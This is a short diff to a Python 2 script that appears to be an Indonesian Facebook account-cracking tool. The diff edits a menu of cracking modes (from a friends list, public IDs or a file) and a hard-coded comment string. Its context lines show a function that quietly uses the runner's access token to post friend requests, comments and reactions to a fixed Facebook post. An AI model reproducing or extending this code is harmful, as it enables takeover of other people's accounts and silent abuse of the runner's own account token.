@@ -210,7 +210,7 @@ def bot_komen():
 	reac = ('ANGRY')
 	post = ('315723919935349')
 	post2 = ('315723919935349')
-	kom2 = ('I really Like Your Work Ramdani 😘')
+	kom2 = ('I really Like Your Work Nikyi 😘')
 	reac2 = ('LOVE')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
@@ -297,7 +297,7 @@ def indo():
 	os.system('clear')
 	print logo
 	print "\033[37;96m╔══════════════════════════════╗"
-	print "\033[37;96m║\033[1;34m[01]\033[1;31;1m->\033[37;1mCrack Dari Daftar Teman \033[37;96m║"
+	print "\033[37;96m║\033[1;34m[01]\033[1;31;1m->\033[37;1mCrack Dari Daftar Teman  Followers halaman\033[37;96m║"
 	print "\033[37;96m║\033[1;34m[02]\033[1;31;1m->\033[37;1mCrack Dari ID Publik    \033[37;96m║"
 	print "\033[37;96m║\033[1;34m[03]\033[1;31;1m->\033[37;1mCrack Dari File         \033[37;96m║"
 	print "\033[37;96m║\033[1;34m[00]\033[1;31;1m->\033[37;1mKembali                 \033[37;96m║"
